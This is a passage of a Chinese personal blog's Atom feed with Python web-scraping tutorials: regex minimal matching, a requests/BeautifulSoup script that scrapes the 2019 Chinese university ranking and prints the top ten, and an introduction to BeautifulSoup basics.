class="string">&#x27;PYANBNCNDN&#x27;</span></span><br></pre></td></tr></table></figure><p>通过在操作符后加?变成最小匹配  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; match = re.search(<span class="string">r&#x27;PY.*?N&#x27;</span>, <span class="string">&#x27;PYANBNCNDN&#x27;</span>)</span><br><span class="line">&gt;&gt;&gt; match.group(<span class="number">0</span>)</span><br><span class="line"><span class="string">&#x27;PYAN&#x27;</span></span><br></pre></td></tr></table></figure><p><strong>最小匹配操作符</strong></p><table><thead><tr><th align="center">操作符</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">*?</td><td align="center">前一个字符0次或无限次扩展，最小匹配</td></tr><tr><td align="center">+?</td><td align="center">前一个字符1次或无限次扩展，最小匹配</td></tr><tr><td align="center">??</td><td align="center">前一个字符0次或1次扩展，最小匹配</td></tr><tr><td align="center">{m,n}?</td><td align="center">扩展前一个字符m至n次（含n），最小匹配</td></tr></tbody></table><hr><p>linux课里也要求学正则，vim里查找替换时用到，表单也用正则来校验，既然是通用框架，<strong>牛逼</strong>就完事了。</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;正则表达式&quot;&gt;&lt;a href=&quot;#正则表达式&quot; class=&quot;headerlink&quot; title=&quot;正则表达式&quot;&gt;&lt;/a&gt;正则表达式&lt;/h1&gt;&lt;h2 id=&quot;概念&quot;&gt;&lt;a href=&quot;#概念&quot; class=&quot;headerlink&quot; title=&quot;概念&quot;&gt;&lt;/a&gt;概念&lt;/h2&gt;&lt;p&gt;用来表示&lt;strong&gt;一组&lt;/strong&gt;字符串的表达式，通用字符串表达框架，十分强大。&lt;br&gt;主要应用在字符串匹配中。&lt;/p&gt;
&lt;h2 id=&quot;操作符&quot;&gt;&lt;a href=&quot;#操作符&quot; class=&quot;headerlink&quot; title=&quot;操作符&quot;&gt;&lt;/a&gt;操作符&lt;/h2&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align=&quot;center&quot;&gt;操作符&lt;/th&gt;
&lt;th align=&quot;center&quot;&gt;说明&lt;/th&gt;
&lt;th align=&quot;center&quot;&gt;实例&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;.&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;表示任何单个字符&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;[ ]&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;字符集，对单个字符给出取值范围&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;[abc]表示a、b、c，[a‐z]表示a到z单个字符&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;[^ ]&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;非字符集，对单个字符给出排除范围&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;[^abc]表示非a或b或c的单个字符&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;*&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;前一个字符0次或无限次扩展&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;abc* 表示ab、abc、abcc、abccc等&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;+&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;前一个字符1次或无限次扩展&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;abc+ 表示abc、abcc、abccc等&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;?&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;前一个字符0次或1次扩展&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;abc? 表示ab、abc&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;|&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;左右表达式任意一个&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;abc|def表示abc、def&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;{m}&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;扩展前一个字符m次&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;ab{2}c表示abbc&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;{m,n}&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;扩展前一个字符m至n次（含n）&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;ab{1,2}c表示abc、abbc&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;^&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;匹配字符串开头&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;^abc表示abc且在一个字符串的开头&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;$&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;匹配字符串结尾&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;abc$表示abc且在一个字符串的结尾&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;( )&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;分组标记，内部只能使用| 操作符&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;(abc)表示abc，(abc|def)表示abc、def&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;\d&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;数字，等价于[0‐9]&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;\w&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;单词字符，等价于[A‐Za‐z0‐9_]&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;</summary>
    
    
    
    <category term="Python" scheme="https://sncker.github.io/blog/categories/Python/"/>
    
    <category term="爬虫" scheme="https://sncker.github.io/blog/categories/Python/%E7%88%AC%E8%99%AB/"/>
    
    
  </entry>
  
  <entry>
    <title>Python网络爬虫--定向爬取中国大学排名</title>
    <link href="https://sncker.github.io/blog/2019/07/26/Python%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB-%E5%AE%9A%E5%90%91%E7%88%AC%E5%8F%96%E4%B8%AD%E5%9B%BD%E5%A4%A7%E5%AD%A6%E6%8E%92%E5%90%8D/"/>
    <id>https://sncker.github.io/blog/2019/07/26/Python%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB-%E5%AE%9A%E5%90%91%E7%88%AC%E5%8F%96%E4%B8%AD%E5%9B%BD%E5%A4%A7%E5%AD%A6%E6%8E%92%E5%90%8D/</id>
    <published>2019-07-26T00:28:00.000Z</published>
    <updated>2020-01-02T12:30:27.807Z</updated>
    
    <content type="html"><![CDATA[<h1 id="定向爬取中国大学排名"><a href="#定向爬取中国大学排名" class="headerlink" title="定向爬取中国大学排名"></a>定向爬取中国大学排名</h1><h2 id="模块设计"><a href="#模块设计" class="headerlink" title="模块设计"></a>模块设计</h2><p>目标网站：<a href="http://www.zuihaodaxue.cn/zuihaodaxuepaiming2019.html">http://www.zuihaodaxue.cn/zuihaodaxuepaiming2019.html</a>  </p><p>爬的是2019年的排名，先祭出框架。  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getHTMLText</span>(<span class="params">url</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        res = requests.get(url)</span><br><span class="line">        res.raise_for_status()</span><br><span class="line">        res.encoding = res.apparent_encoding</span><br><span class="line">        <span class="keyword">return</span> res.text</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;异常&quot;</span></span><br></pre></td></tr></table></figure><a id="more"></a><p>再编写一个函数来提取关键信息，将每一条记录存入列表中。  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> bs4</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fillUnivList</span>(<span class="params">ulist, html</span>):</span></span><br><span class="line">    soup = bs4.BeautifulSoup(html, <span class="string">&quot;html.parser&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> tr <span class="keyword">in</span> soup.find(<span class="string">&#x27;tbody&#x27;</span>).children:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(tr, bs4.element.Tag):</span><br><span class="line">            ulist.append([tr(<span class="string">&#x27;td&#x27;</span>)[<span class="number">0</span>].string, tr(<span class="string">&#x27;td&#x27;</span>)[<span class="number">1</span>].string, tr(<span class="string">&#x27;td&#x27;</span>)[<span class="number">2</span>].string, tr(<span class="string">&#x27;td&#x27;</span>)[<span class="number">3</span>].string])</span><br></pre></td></tr></table></figure><p>涉及到节点的问题，这些子节点不仅有标签，还有注释，字符串。可以在源代码中看出来，也可以用type打印每一个节点查看它们的类型。所以要用isinstance判断类型。  </p><p>接下来再写一个排版输出的函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printUnivRank</span>(<span class="params">ulist, num</span>):</span></span><br><span class="line">    print(<span class="string">&quot;&#123;0:^16&#125;\t&#123;1:&#123;3&#125;^16&#125;\t&#123;2:^16&#125;&quot;</span>.<span class="built_in">format</span>(<span class="string">&quot;排名&quot;</span>, <span class="string">&quot;学校名称&quot;</span>, <span class="string">&quot;位置&quot;</span>, <span class="built_in">chr</span>(<span class="number">12288</span>)))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num):</span><br><span class="line">        print(<span class="string">&quot;&#123;0:^16&#125;\t&#123;1:&#123;3&#125;^16&#125;\t&#123;2:^16&#125;&quot;</span>.<span class="built_in">format</span>(ulist[i][<span class="number">0</span>], ulist[i][<span class="number">1</span>], ulist[i][<span class="number">2</span>], <span class="built_in">chr</span>(<span class="number">12288</span>)))</span><br></pre></td></tr></table></figure><p>跟着视频做，据说是对齐问题，要用chr(12288)字符，就是中文的全角空格。<br>字段宽度可以适当的设大一点。  </p><h2 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> bs4</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getHTMLText</span>(<span class="params">url</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        res = requests.get(url)</span><br><span class="line">        res.raise_for_status()</span><br><span class="line">        res.encoding = res.apparent_encoding</span><br><span class="line">        <span class="keyword">return</span> res.text</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;异常&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fillUnivList</span>(<span class="params">ulist, html</span>):</span></span><br><span class="line">    soup = bs4.BeautifulSoup(html, <span class="string">&quot;html.parser&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> tr <span class="keyword">in</span> soup.find(<span class="string">&#x27;tbody&#x27;</span>).children:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(tr, bs4.element.Tag):</span><br><span class="line">            ulist.append([tr(<span class="string">&#x27;td&#x27;</span>)[<span class="number">0</span>].string, tr(<span class="string">&#x27;td&#x27;</span>)[<span class="number">1</span>].string, tr(<span class="string">&#x27;td&#x27;</span>)[<span class="number">2</span>].string, tr(<span class="string">&#x27;td&#x27;</span>)[<span class="number">3</span>].string])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printUnivRank</span>(<span class="params">ulist, num</span>):</span></span><br><span class="line">    print(<span class="string">&quot;&#123;0:^16&#125;\t&#123;1:&#123;3&#125;^16&#125;\t&#123;2:^16&#125;&quot;</span>.<span class="built_in">format</span>(<span class="string">&quot;排名&quot;</span>, <span class="string">&quot;学校名称&quot;</span>, <span class="string">&quot;位置&quot;</span>, <span class="built_in">chr</span>(<span class="number">12288</span>)))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num):</span><br><span class="line">        print(<span class="string">&quot;&#123;0:^16&#125;\t&#123;1:&#123;3&#125;^16&#125;\t&#123;2:^16&#125;&quot;</span>.<span class="built_in">format</span>(ulist[i][<span class="number">0</span>], ulist[i][<span class="number">1</span>], ulist[i][<span class="number">2</span>], <span class="built_in">chr</span>(<span class="number">12288</span>)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    url = <span class="string">&quot;http://www.zuihaodaxue.cn/zuihaodaxuepaiming2019.html&quot;</span></span><br><span class="line">    text = getHTMLText(url)</span><br><span class="line">    ulist = []</span><br><span class="line">    fillUnivList(ulist, text)</span><br><span class="line">    printUnivRank(ulist, <span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">main()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h2><pre><code>排名           　　　　　学校名称　　　　　　           位置       1            　　　　　　清华大学　　　　　　           北京       2            　　　　　　北京大学　　　　　　           北京       3            　　　　　　浙江大学　　　　　　           浙江       4            　　　　　上海交通大学　　　　　           上海       5            　　　　　　复旦大学　　　　　　           上海       6            　　　　中国科学技术大学　　　　           安徽       7            　　　　　华中科技大学　　　　　           湖北       7            　　　　　　南京大学　　　　　　           江苏       9            　　　　　　中山大学　　　　　　           广东       10           　　　　哈尔滨工业大学　　　　　          黑龙江       </code></pre><p>这是个很典型的实例，python实验课也做了一次，但是比较匆忙直接摘抄网上的，现在再做一次顺便写个博客真是美滋滋。</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;定向爬取中国大学排名&quot;&gt;&lt;a href=&quot;#定向爬取中国大学排名&quot; class=&quot;headerlink&quot; title=&quot;定向爬取中国大学排名&quot;&gt;&lt;/a&gt;定向爬取中国大学排名&lt;/h1&gt;&lt;h2 id=&quot;模块设计&quot;&gt;&lt;a href=&quot;#模块设计&quot; class=&quot;headerlink&quot; title=&quot;模块设计&quot;&gt;&lt;/a&gt;模块设计&lt;/h2&gt;&lt;p&gt;目标网站：&lt;a href=&quot;http://www.zuihaodaxue.cn/zuihaodaxuepaiming2019.html&quot;&gt;http://www.zuihaodaxue.cn/zuihaodaxuepaiming2019.html&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;爬的是2019年的排名，先祭出框架。  &lt;/p&gt;
&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; requests&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;getHTMLText&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;url&lt;/span&gt;):&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;try&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        res = requests.get(url)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        res.raise_for_status()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        res.encoding = res.apparent_encoding&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; res.text&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;except&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&amp;quot;异常&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="Python" scheme="https://sncker.github.io/blog/categories/Python/"/>
    
    <category term="爬虫" scheme="https://sncker.github.io/blog/categories/Python/%E7%88%AC%E8%99%AB/"/>
    
    
  </entry>
  
  <entry>
    <title>Python网络爬虫--BeautifulSoup库</title>
    <link href="https://sncker.github.io/blog/2019/07/22/Python%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB-BeautifulSoup%E5%BA%93/"/>
    <id>https://sncker.github.io/blog/2019/07/22/Python%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB-BeautifulSoup%E5%BA%93/</id>
    <published>2019-07-22T11:14:00.000Z</published>
    <updated>2020-01-02T12:31:07.848Z</updated>
    
    <content type="html"><![CDATA[<h1 id="BeautifulSoup库"><a href="#BeautifulSoup库" class="headerlink" title="BeautifulSoup库"></a>BeautifulSoup库</h1><h2 id="简单使用"><a href="#简单使用" class="headerlink" title="简单使用"></a>简单使用</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line">soup = BeautifulSoup(<span class="string">&quot;&lt;p&gt;python&lt;/p&gt;&quot;</span>,<span class="string">&quot;html.parser&quot;</span>)</span><br></pre></td></tr></table></figure><a id="more"></a><p>教授管这叫美丽汤，给它个文本，再加个解析器就能熬汤了。  </p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> requests</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.get(<span class="string">&quot;http://python123.io/ws/demo.html&quot;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r.text</span><br><span class="line"><span class="string">&#x27;&lt;html&gt;&lt;head&gt;&lt;title&gt;This is a python demo page&lt;/title&gt;&lt;/head&gt;\r\n&lt;body&gt;\r\n&lt;p class=&quot;title&quot;&gt;&lt;b&gt;The demo python introduces several python courses.&lt;/b&gt;&lt;/p&gt;\r\n&lt;p class=&quot;course&quot;&gt;Python is a wonderful general-purpose programming language. You can learn Python from novice to professional by tracking the following courses:\r\n&lt;a href=&quot;http://www.icourse163.org/course/BIT-268001&quot; class=&quot;py1&quot; id=&quot;link1&quot;&gt;Basic Python&lt;/a&gt; and &lt;a href=&quot;http://www.icourse163.org/course/BIT-1001870001&quot; class=&quot;py2&quot; id=&quot;link2&quot;&gt;Advanced Python&lt;/a&gt;.&lt;/p&gt;\r\n&lt;/body&gt;&lt;/html&gt;&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>demo = r.text</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>soup = BeautifulSoup(demo,<span class="string">&quot;html.parser&quot;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>soup</span><br><span class="line">&lt;html&gt;&lt;head&gt;&lt;title&gt;This is a python demo page&lt;/title&gt;&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;p class=&quot;title&quot;&gt;&lt;b&gt;The demo python introduces several python courses.&lt;/b&gt;&lt;/p&gt;</span><br><span class="line">&lt;p class=&quot;course&quot;&gt;Python is a wonderful general-purpose programming language. You can learn Python from novice to professional by tracking the following courses:</span><br><span class="line"></span><br><span class="line">&lt;a class=&quot;py1&quot; href=&quot;http://www.icourse163.org/course/BIT-268001&quot; id=&quot;link1&quot;&gt;Basic Python&lt;/a&gt; and &lt;a class=&quot;py2&quot; href=&quot;http://www.icourse163.org/course/BIT-1001870001&quot; id=&quot;link2&quot;&gt;Advanced Python&lt;/a&gt;.&lt;/p&gt;</span><br><span class="line">&lt;/body&gt;&lt;/html&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(soup.prettify())</span><br><span class="line">&lt;html&gt;</span><br><span class="line"> &lt;head&gt;</span><br><span class="line">  &lt;title&gt;</span><br><span class="line">   This <span class="keyword">is</span> a python demo page</span><br><span class="line">  &lt;/title&gt;</span><br><span class="line"> &lt;/head&gt;</span><br><span class="line"> &lt;body&gt;</span><br><span class="line">  &lt;p class=&quot;title&quot;&gt;</span><br><span class="line">   &lt;b&gt;</span><br><span class="line">    The demo python introduces several python courses.</span><br><span class="line">   &lt;/b&gt;</span><br><span class="line">  &lt;/p&gt;</span><br><span class="line">  &lt;p class=&quot;course&quot;&gt;</span><br><span class="line">   Python <span class="keyword">is</span> a wonderful general-purpose programming language. You can learn Python <span class="keyword">from</span> novice to professional by tracking the following courses:</span><br><span class="line">   &lt;a class=&quot;py1&quot; href=&quot;http://www.icourse163.org/course/BIT-268001&quot; id=&quot;link1&quot;&gt;</span><br><span class="line">    Basic Python</span><br><span class="line">   &lt;/a&gt;</span><br><span class="line">   <span class="keyword">and</span></span><br><span class="line">   &lt;a class=&quot;py2&quot; href=&quot;http://www.icourse163.org/course/BIT-1001870001&quot; id=&quot;link2&quot;&gt;</span><br><span class="line">    Advanced Python</span><br><span class="line">   &lt;/a&gt;</span><br><span class="line">   .</span><br><span class="line">  &lt;/p&gt;</span><br><span class="line"> &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>prettify()方法可以将文本美化排版。</p><h2 id="BeautifulSoup库的理解"><a href="#BeautifulSoup库的理解" class="headerlink" title="BeautifulSoup库的理解"></a>BeautifulSoup库的理解</h2><h3 id="BeautifulSoup类"><a href="#BeautifulSoup类" class="headerlink" title="BeautifulSoup类"></a>BeautifulSoup类</h3><p>BeautifulSoup库又叫beatifulsoup4,bs4</p><p>一般引用BeautifulSoup类就够了  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br></pre></td></tr></table></figure><p>至于BeautifulSoup这个类其实跟HTML文档是等价的，它提供了一些方法来操作标签树以提取我们需要的信息。  </p><h3 id="解析器"><a href="#解析器" class="headerlink" title="解析器"></a>解析器</h3><p>BeautifulSoup库支持四种解析器  </p><table><thead><tr><th align="center">解析器</th><th align="center">使用方法</th><th align="center">条件</th></tr></thead><tbody><tr><td align="center">bs4的HTML解析器</td><td align="center">BeautifulSoup(mk,&#39;html.parser&#39;)</td><td align="center">安装bs4库</td></tr><tr><td align="center">lxml的HTML解析器</td><td align="center">BeautifulSoup(mk,&#39;lxml&#39;)</td><td align="center">pip install lxml</td></tr><tr><td align="center">lxml的XML解析器</td><td align="center">BeautifulSoup(mk,&#39;xml&#39;)</td><td align="center">pip install lxml</td></tr><tr><td align="center">html5lib的解析器</td><td align="center">BeautifulSoup(mk,&#39;html5lib&#39;)</td><td align="center">pip install html5lib</td></tr></tbody></table><h3 id="基本元素"><a href="#基本元素" class="headerlink" title="基本元素"></a>基本元素</h3><table><thead><tr><th align="center">基本元素</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">Tag</td><td align="center">标签，最基本的信息组织单元，分别用&lt;&gt;和&lt;/&gt;标明开头和结尾</td></tr><tr><td align="center">Name</td><td align="center">标签的名字，&lt;p&gt;…&lt;/p&gt;的名字是&#39;p&#39;，格式：&lt;tag&gt;.name</td></tr><tr><td align="center">Attributes</td><td align="center">标签的属性，字典形式组织，格式：&lt;tag&gt;.attrs</td></tr><tr><td align="center">NavigableString</td><td align="center">标签内非属性字符串，&lt;&gt;…&lt;/&gt;中字符串，格式：&lt;tag&gt;.string</td></tr><tr><td align="center">Comment</td><td align="center">标签内字符串的注释部分，一种特殊的Comment类型</td></tr></tbody></table><p>用上面的demo例子来实验。<br>1.通过soup.&lt;Tag&gt;来获得标签，当标签存在多个时只能获取第一个。  </p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>soup.title</span><br><span class="line">&lt;title&gt;This is a python demo page&lt;/title&gt;</span><br></pre></td></tr></table></figure><p>2.通过Tag.name获取标签名字，Tag.parent获取上级标签</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>soup.a.name</span><br><span class="line"><span class="string">&#x27;a&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>soup.a.parent.name</span><br><span class="line"><span class="string">&#x27;p&#x27;</span></span><br></pre></td></tr></table></figure><p>3.通过Tag.attrs获取标签属性</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>soup.a.attrs</span><br><span class="line">&#123;<span class="string">&#x27;href&#x27;</span>: <span 